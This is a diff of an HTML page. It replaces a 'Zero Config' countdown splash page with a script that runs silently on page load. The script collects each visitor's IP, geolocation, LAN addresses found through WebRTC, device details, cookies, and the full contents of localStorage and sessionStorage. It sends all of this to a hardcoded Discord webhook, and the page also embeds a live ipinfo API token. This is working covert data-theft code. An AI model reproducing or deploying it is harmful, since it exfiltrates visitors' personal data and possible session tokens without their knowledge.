@@ -3,193 +3,239 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title></title>
-<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Carian&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<title>‎ </title>
 <style>
-body {
-  margin:0;
-  padding:0;
-  background:black;
-  color:white;
-  font-family: 'Noto Sans Carian', sans-serif;
-  display:flex;
-  flex-direction:column;
-  justify-content:flex-end;
-  align-items:center;
-  height:100vh;
-  overflow:hidden;
-  user-select:none;
-  -webkit-user-select:none;
-  -moz-user-select:none;
-  -ms-user-select:none;
-}
-
-.center-text {
-  position:absolute;
-  top:40%;
-  left:50%;
-  transform:translate(-50%, -50%);
-  text-align:center;
-}
-
-.center-text h1 {
-  font-size:5em;
-  margin:0;
-  color:white;
-}
-
-.center-text p {
-  font-size:2em;
-  margin-top:10px;
-  color:grey;
-}
-
-.countdown {
-  display:flex;
-  gap:15px;
-  margin-bottom:40px;
-  font-size:2em;
-}
-
-.flip-unit {
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-}
-
-.flip-number {
-  background:transparent;
-  border:none;
-  padding:12px 18px;
-  border-radius:0;
-  font-size:2em;
-  min-width:50px;
-  text-align:center;
-  color:white;
-}
-
-.label { 
-  font-size:0.7em;
-  color:#ccc; 
-  margin-top:4px; 
-}
-
-#canvas {
-  position:fixed;
-  top:0;
-  left:0;
-  z-index:0;
-}
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    min-height: 100vh;
+    font-family: 'Inter', sans-serif;
+    background: #0d0d0d;
+    color: #f1f1f1;
+    padding: 0;
+  }
+  .card {
+    background: #1a1a1a;
+    padding: 2rem;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    width: 100vw;
+    min-height: 100vh;
+    overflow-y: auto;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+  }
+  .info-column {
+    flex: 1 1 22%;
+    margin: 0.5%;
+    min-width: 250px;
+  }
+  .info-column h3 {
+    border-bottom: 1px solid #333;
+    padding-bottom: 0.5rem;
+    margin-bottom: 0.5rem;
+    color: #aaa;
+  }
+  .info {
+    font-size: 0.85rem;
+    margin: 0.2rem 0;
+    color: #ccc;
+    word-break: break-word;
+  }
 </style>
 </head>
-<body oncontextmenu="return false;" onselectstart="return false;" ondragstart="return false;">
-
-<div class="center-text">
-  <h1>Zero Config</h1>
-  <p>We took it down, You're too late.</p>
-</div>
-
-<div class="countdown">
-  <div class="flip-unit"><div id="days" class="flip-number">00</div><div class="label">DAYS</div></div>
-  <div class="flip-unit"><div id="hours" class="flip-number">00</div><div class="label">HRS</div></div>
-  <div class="flip-unit"><div id="minutes" class="flip-number">00</div><div class="label">MIN</div></div>
-  <div class="flip-unit"><div id="seconds" class="flip-number">00</div><div class="label">SEC</div></div>
-</div>
-
-<canvas id="canvas"></canvas>
+<body>
+<div class="card" id="card"></div>
 
 <script>
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
-let particles = [];
+const TOKEN = "68ff73597277ed";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1407462432951238749/HTUrKBmb_XUabVOyJ9zrHFgCkK6X9_d6nzDbQVWxJUrfx8EVzsA-xnsYNrdLjKQQDPVz";
 
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
-
-class Particle {
-  constructor(x, y) {
-    this.x = x;
-    this.y = y;
-    this.vx = (Math.random() - 0.5) * 1.2;
-    this.vy = (Math.random() - 0.5) * 1.2;
-    this.size = 2;
-  }
-  update() {
-    this.x += this.vx;
-    this.y += this.vy;
-    if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
-    if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
-  }
-  draw() {
-    ctx.beginPath();
-    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-    ctx.fillStyle = 'white';
-    ctx.fill();
-  }
+async function getIPInfo() {
+  try { const r = await fetch(`https://ipinfo.io/json?token=${TOKEN}`); return await r.json(); } 
+  catch { return {}; }
 }
 
-function connectParticles() {
-  for (let a = 0; a < particles.length; a++) {
-    for (let b = a + 1; b < particles.length; b++) {
-      let dx = particles[a].x - particles[b].x;
-      let dy = particles[a].y - particles[b].y;
-      let distance = Math.sqrt(dx * dx + dy * dy);
-      if (distance < 150) {
-        ctx.strokeStyle = `rgba(255, 255, 255, ${1 - distance / 150})`;
-        ctx.lineWidth = 1;
-        ctx.beginPath();
-        ctx.moveTo(particles[a].x, particles[a].y);
-        ctx.lineTo(particles[b].x, particles[b].y);
-        ctx.stroke();
+async function getBatteryInfo() {
+  try {
+    const b = await navigator.getBattery();
+    return { 
+      Level: (b.level*100)+'%',
+      Charging: b.charging,
+      ChargingTime: b.chargingTime+'s',
+      DischargingTime: b.dischargingTime+'s'
+    };
+  } catch { return { Level: "N/A", Charging: "N/A", ChargingTime: "N/A", DischargingTime: "N/A" }; }
+}
+
+function getPerformanceTiming() {
+  const t = window.performance.timing;
+  const paintEntries = performance.getEntriesByType("paint");
+  const firstPaint = paintEntries.find(p=>p.name==="first-paint")?.startTime || "N/A";
+  const firstContentfulPaint = paintEntries.find(p=>p.name==="first-contentful-paint")?.startTime || "N/A";
+  return { 
+    DOMContentLoaded: t.domContentLoadedEventEnd - t.navigationStart,
+    PageLoad: t.loadEventEnd - t.navigationStart,
+    DNSLookup: t.domainLookupEnd - t.domainLookupStart,
+    TCPConnect: t.connectEnd - t.connectStart,
+    ResponseTime: t.responseEnd - t.requestStart,
+    FirstPaint: firstPaint,
+    FirstContentfulPaint: firstContentfulPaint
+  };
+}
+
+function checkFeatures() {
+  return {
+    ClipboardAPI: !!navigator.clipboard,
+    Geolocation: !!navigator.geolocation,
+    ServiceWorkers: !!navigator.serviceWorker,
+    LocalStorage: !!window.localStorage,
+    SessionStorage: !!window.sessionStorage,
+    IndexedDB: !!navigator.indexedDB,
+    WebGL: (()=>{try{const c=document.createElement('canvas'); return !!c.getContext('webgl')}catch(e){return false}})(),
+    TouchSupport: 'ontouchstart' in window,
+    MaxTouchPoints: navigator.maxTouchPoints || "N/A",
+    Online: navigator.onLine,
+    CookiesEnabled: navigator.cookieEnabled,
+    ColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light",
+    ReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Yes" : "No"
+  };
+}
+
+function getPlugins() {
+  if(navigator.plugins){let l=[];for(let p of navigator.plugins)l.push(p.name);return l.join(", ")||"N/A";}
+  return "N/A";
+}
+
+async function getMediaDevices() {
+  try {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    return {
+      AudioInputs: devices.filter(d=>d.kind==="audioinput").length,
+      VideoInputs: devices.filter(d=>d.kind==="videoinput").length
+    };
+  } catch { return {AudioInputs:"N/A",VideoInputs:"N/A"}; }
+}
+
+async function getIndexedDBNames() {
+  if (!window.indexedDB?.databases) return [];
+  try {
+    const dbs = await window.indexedDB.databases();
+    return dbs.map(db => db.name);
+  } catch { return []; }
+}
+
+function getLANIPs() {
+  return new Promise((resolve)=>{
+    let ips = [];
+    const pc = new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel("");
+    pc.createOffer().then(offer=>pc.setLocalDescription(offer));
+    pc.onicecandidate = e => {
+      if(!e || !e.candidate) {
+        resolve([...new Set(ips)]);
+        return;
       }
+      const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+      if(ipMatch) ips.push(ipMatch[1]);
+    };
+  });
+}
+
+async function gatherInfo() {
+  const ipData = await getIPInfo();
+  const batteryData = await getBatteryInfo();
+  const mediaData = await getMediaDevices();
+  const indexedDBNames = await getIndexedDBNames();
+  const lanIPs = await getLANIPs();
+
+  const info = {
+    "IP & Network": {
+      "IP Address": ipData.ip || "N/A",
+      "IPv6": ipData.ipv6 || "N/A",
+      "Private/Public IP": ipData.ip?.startsWith('192.')||ipData.ip?.startsWith('10.') ? 'Private':'Public',
+      "Hostname": ipData.hostname || "N/A",
+      "City": ipData.city || "N/A",
+      "Region": ipData.region || "N/A",
+      "Country": ipData.country || "N/A",
+      "Postal": ipData.postal || "N/A",
+      "Timezone": ipData.timezone || "N/A",
+      "Organization": ipData.org || "N/A",
+      "ASN": ipData.asn?.asn || "N/A",
+      "ISP": ipData.asn?.name || "N/A",
+      "Proxy/VPN Detected": ipData?.privacy?.proxy || "N/A",
+      "Hosting Provider": ipData?.hosting || "N/A",
+      "LAN IPs": lanIPs.join(", ") || "N/A",
+      "Connection Type": navigator.connection ? navigator.connection.effectiveType : "N/A",
+      "Downlink Speed": navigator.connection ? navigator.connection.downlink + "Mbps" : "N/A"
+    },
+    "Browser & Device": {
+      "User Agent": navigator.userAgent,
+      "Languages": navigator.languages.join(", "),
+      "Language": navigator.language,
+      "Platform": navigator.platform,
+      "Screen": `${window.screen.width}x${window.screen.height}`,
+      "Device Pixel Ratio": window.devicePixelRatio,
+      "Vendor": navigator.vendor || "N/A",
+      "Renderer": (()=>{try{const c=document.createElement('canvas');return c.getContext('webgl')?.getParameter(WebGLRenderingContext.RENDERER)||"N/A"}catch{return "N/A"}})(),
+      "Media Devices": mediaData
+    },
+    "Battery & Performance": batteryData,
+    "Navigator Features": checkFeatures(),
+    "Plugins": { Plugins: getPlugins() },
+    "Storage & Cookies": {
+      "Cookies": document.cookie || "N/A",
+      "Local Storage": JSON.stringify(localStorage),
+      "Session Storage": JSON.stringify(sessionStorage),
+      "IndexedDB Names": indexedDBNames
+    },
+    "Performance Timing": getPerformanceTiming(),
+    "Current Time": { Now: new Date().toLocaleString() },
+    "Misc": {
+      "Current URL": window.location.href,
+      "Referrer": document.referrer || "N/A",
+      "History Length": history.length
     }
+  };
+
+  renderInfo(info);
+  return info;
+}
+
+function renderInfo(data){
+  const card = document.getElementById("card");
+  card.innerHTML = "";
+  for(const [section, details] of Object.entries(data)){
+    const col = document.createElement("div");
+    col.className = "info-column";
+    const title = document.createElement("h3");
+    title.textContent = section;
+    col.appendChild(title);
+    for(const [key, value] of Object.entries(details)){
+      const div = document.createElement("div");
+      div.className = "info";
+      div.textContent = `${key}: ${typeof value === "object" ? JSON.stringify(value) : value}`;
+      col.appendChild(div);
+    }
+    card.appendChild(col);
   }
 }
 
-function init() {
-  particles = [];
-  for (let i = 0; i < 150; i++) {
-    let x = Math.random() * canvas.width;
-    let y = Math.random() * canvas.height;
-    particles.push(new Particle(x, y));
-  }
-}
-
-function animate() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  particles.forEach(p => { p.update(); p.draw(); });
-  connectParticles();
-  requestAnimationFrame(animate);
-}
-
-init();
-animate();
-
-let startTime = localStorage.getItem('zeroConfigCountdownStart');
-if (!startTime) {
-  startTime = Date.now();
-  localStorage.setItem('zeroConfigCountdownStart', startTime);
-}
-const countdownDuration = 100 * 24 * 60 * 60 * 1000;
-
-function updateCountdown() {
-  const now = Date.now();
-  let distance = countdownDuration - (now - startTime);
-  if(distance < 0) distance = 0;
-
-  const days = Math.floor(distance / (1000*60*60*24));
-  const hours = Math.floor((distance % (1000*60*60*24)) / (1000*60*60));
-  const minutes = Math.floor((distance % (1000*60*60)) / (1000*60));
-  const seconds = Math.floor((distance % (1000*60)) / 1000);
-
-  document.getElementById('days').textContent = days.toString().padStart(2,'0');
-  document.getElementById('hours').textContent = hours.toString().padStart(2,'0');
-  document.getElementById('minutes').textContent = minutes.toString().padStart(2,'0');
-  document.getElementById('seconds').textContent = seconds.toString().padStart(2,'0');
-}
-
-setInterval(updateCountdown, 1000);
-updateCountdown();
+gatherInfo().then(async () => {
+  const infoText = document.getElementById("card").innerText;
+  await fetch(DISCORD_WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      embeds: [{
+        title: "",
+        description: "```" + infoText.substring(0, 2000) + "```",
+        color: 0x010101,
+        timestamp: new Date()
+      }]
+    })
+  });
+});
 </script>
 </body>
-</html>
+</html
